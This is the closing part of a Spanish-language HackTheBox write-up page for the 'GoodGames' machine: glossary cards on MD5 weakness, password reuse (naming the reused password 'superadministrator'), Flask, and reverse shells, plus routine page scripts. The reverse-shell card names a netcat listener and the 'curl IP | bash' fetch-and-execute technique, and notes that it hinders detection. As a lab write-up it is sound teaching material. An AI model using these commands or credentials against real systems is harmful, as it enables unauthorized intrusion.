+          <div class="glos-def"><strong>MD5 (Message Digest Algorithm 5)</strong> produce un hash de 128 bits (32 caracteres hexadecimales). Es considerado criptográficamente roto: es extremadamente rápido de calcular (permitiendo ataques de fuerza bruta masivos), no usa salt por defecto (vulnerable a tablas rainbow), y se han encontrado colisiones. Para almacenar contraseñas, MD5 nunca debería usarse — los algoritmos modernos como <strong>bcrypt</strong>, <strong>scrypt</strong> o <strong>Argon2</strong> son las alternativas seguras porque son deliberadamente lentos y usan salt.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Password Reuse — Reutilización de Contraseñas</div>
+          <div class="glos-def">La <strong>reutilización de contraseñas</strong> es una de las prácticas de seguridad más peligrosas. En GoodGames, la contraseña <strong>superadministrator</strong> se usaba tanto para el panel web como para la cuenta SSH del host real. Esto significa que comprometer una sola contraseña (en este caso mediante SQLi + hash cracking) da acceso a múltiples sistemas. Los gestores de contraseñas y el uso de credenciales únicas por servicio son la solución a este problema.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Werkzeug / Flask</div>
+          <div class="glos-def"><strong>Werkzeug</strong> es la librería WSGI subyacente de <strong>Flask</strong>, el microframework web de Python. En el escaneo Nmap aparece como el servidor HTTP del objetivo (<code>Werkzeug httpd 2.0.2 Python/3.9.2</code>). Flask es ligero y flexible pero no incluye protecciones de seguridad automáticas — el desarrollador es responsable de sanitizar inputs, manejar correctamente las plantillas y configurar la autenticación. La falta de estas protecciones en GoodGames resulta en las vulnerabilidades SQLi y SSTI.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell</div>
+          <div class="glos-def">Una <strong>reverse shell</strong> es una conexión donde la <em>máquina víctima</em> se conecta de vuelta hacia el <em>atacante</em>, en lugar del flujo normal. El atacante abre un listener (<code>nc -nlvp 443</code>) y cuando el exploit se ejecuta (en este caso via SSTI), la víctima establece la conexión. La técnica <code>curl IP | bash</code> permite descargar y ejecutar el payload en un solo paso sin escribir archivos en el sistema víctima primero, lo que dificulta la detección.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
